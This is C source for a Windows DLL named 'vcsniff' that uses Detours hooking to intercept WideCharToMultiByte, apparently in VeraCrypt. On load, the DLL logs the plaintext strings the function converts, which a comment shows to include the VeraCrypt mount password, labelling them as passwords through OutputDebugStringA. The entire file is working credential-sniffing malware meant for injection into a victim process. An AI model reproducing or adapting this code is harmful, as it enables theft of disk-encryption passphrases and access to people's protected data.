//vcsniff 1.0
#include <stdio.h>
#include <windows.h>
#include "detours.h"
#pragma comment(lib, "user32.lib")

// pointer to original MessageBox
//int (WINAPI * pOrigWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte,  LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar) = WideCharToMultiByte;
int (WINAPI * pOrigWideCharToMultiByte)(
  UINT                               CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
) = WideCharToMultiByte;
BOOL vcsniff(void);
BOOL unVcsniff(void);

// Hooking function
/*
1	UINT	CodePage	CP_UTF8	CP_UTF8
2	DWORD	dwFlags	0	0
3	LPCWSTR	lpWideCharStr	0x00000000050fbbe0 "VeracryptMountPass"	0x00000000050fbbe0 "VeracryptMountPass"
4	int	cchWideChar	-1	-1
5	LPSTR	lpMultiByteStr	0x00007ff78d577704	0x00007ff78d577704 "VeracryptMountPass"
6	int	cbMultiByte	129	129
7	LPCSTR	lpDefaultChar	NULL	NULL
8	LPBOOL	lpUsedDefaultChar	NULL	NULL

*/

int WideCharToMultiByte_hook(
  UINT                               CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
  ){
	HANDLE hFile; 
    
	int ret = pOrigWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	char DataBuffer[100];
	sprintf(DataBuffer,"[WideCharToMultiByte_hook] Pasword_val1 : %s Password_val2 %s \n",lpWideCharStr, lpMultiByteStr);
    OutputDebugStringA(DataBuffer);
	return ret;
}

// Set hooks on MessageBox
BOOL vcsniff(void) {
    LONG err;
	OutputDebugStringA("[vcsniff] Init \n");
	DWORD thread = GetCurrentThreadId();
    OutputDebugStringA("[vcsniff] currentThreadId()\n");
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pOrigWideCharToMultiByte, WideCharToMultiByte_hook);
	err = DetourTransactionCommit();
    OutputDebugStringA("[vcsniff] hooked! \n");
	return TRUE;
}

// Revert all changes to original code
BOOL unVcsniff(void) {
	LONG err;
	DetourTransactionBegin();
	DWORD thread = GetCurrentThreadId();
	OutputDebugStringA("[unVcsniff] currentThreadId() \n");
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pOrigWideCharToMultiByte, WideCharToMultiByte_hook);
	err = DetourTransactionCommit();
    OutputDebugStringA("[unVcsniff] unhooked! \n");
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			vcsniff();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			unVcsniff();
			break;
	}
	
    return TRUE;
}
